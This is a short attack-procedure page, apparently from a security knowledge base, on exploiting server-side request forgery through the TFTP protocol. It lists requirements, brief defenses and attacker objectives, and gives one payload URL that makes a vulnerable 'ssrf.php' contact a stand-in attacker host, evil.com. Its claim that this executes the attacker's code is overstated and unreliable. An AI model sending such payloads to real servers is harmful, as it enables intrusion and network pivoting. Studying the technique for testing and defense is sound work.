# SSRF Exploitation via TFTP Protocol

## Summary

## Description

# Description

TFTP (Trivial File Transfer Protocol) is a protocol used for transferring files between network devices. In this procedure, an attacker can exploit a Server-Side Request Forgery (SSRF) vulnerability via the TFTP protocol. By injecting a malicious payload into the TFTP request, the attacker can force the server to make requests to internal systems or perform actions on behalf of the attacker. This can lead to further compromise of the target system and potentially the entire network. This technique is commonly used by attackers to pivot within a network and gain access to sensitive data or systems.

 

## Requirements

1. Access to a vulnerable web application with SSRF vulnerability

1. Ability to send TFTP requests to the target server

 

## Defense

1. Implement input validation and sanitization to prevent SSRF vulnerabilities

1. Restrict access to TFTP protocol to only trusted hosts

1. Monitor network traffic for suspicious TFTP requests

 

## Objectives

1. Exploit SSRF vulnerability via TFTP protocol

1. Gain access to internal systems or perform actions on behalf of the attacker

1. Pivot within the network

1. Compromise the target system

 

# Instructions

1. This command is used for injecting a TFTP SSRF payload into a target system. The payload is designed to exploit vulnerabilities in the target system and allow the attacker to gain unauthorized access.

 



**Code**: [[ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET]]



> The 'ssrf.php' script is used to inject the TFTP SSRF payload into the target system. The 'url' parameter specifies the IP address and port of the attacker's TFTP server. When the target system attempts to access the specified URL, it will trigger the SSRF payload and execute the attacker's code.



**Command** ([[Send SSRF Attack Request]]):

```bash
ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET
```
